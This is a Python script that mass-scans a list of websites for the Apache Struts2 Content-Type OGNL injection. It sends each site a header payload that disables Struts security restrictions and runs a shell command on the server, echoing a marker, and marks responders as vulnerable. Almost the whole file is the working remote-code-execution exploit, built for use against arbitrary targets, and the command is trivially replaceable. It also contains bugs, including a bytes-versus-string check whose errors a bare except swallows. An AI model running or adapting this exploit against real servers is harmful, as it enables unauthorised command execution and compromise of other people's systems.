
import sys, os
import requests
from etc.set import clear
from etc.banner import banner_drgn
from etc.set import *


def mass_apache(choice):
    c = choice
    os.system('cls' and 'color -a' if os.name == "nt" else 'clear')

    try:
        fil = c
        exp = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo pentesterdesk').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        header={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36','Content-Type':exp}
        print(f" {PULS} Loading... ")
        ob = open(fil,'r')
        lists = ob.readlines()
        list1 = []
        i = 0
        for i in range(len(lists)):
            list1.append(lists[i].strip('\n'))
        for site in list1:
            req= requests.get(url=site,headers=header)
            if 'pentesterdesk' in req.content:
                print(f" {SUCES_SYM} %s [Vulnerable]"%(site))
            else:
                print(f" {ERROR_SYM} %s [Not-Vulnerable]"%(site))

    except:
        pass

def mainscan():
    clear()
    banner_drgn()
    print(f'''
  \u001b[1m[\u001b[32;1m01\u001b[0m\u001b[1m]\u001b[0m Mass Apache ... {SUCES_SYM}
  \u001b[1m[\u001b[32;1m02\u001b[0m\u001b[1m]\u001b[0m XSS Scanner ... {ERROR_SYM}

  [CTRL+C] EXIT\n''')
    try:
        x = input(f'{promt_choice}')
        try:
            z = input(f'{PULS} List  : ')
            if x == 1 or len(x) == 1:
                mass_apache(z)
            elif z == '':
                sys.exit(f'{MINS} Unknown Path.')
            else:
                sys.exit(f'{NFound}')
        except ValueError:
            sys.exit(f'{MINS} Value Error.')
    except KeyboardInterrupt:
        sys.exit(f'{Aborted}')
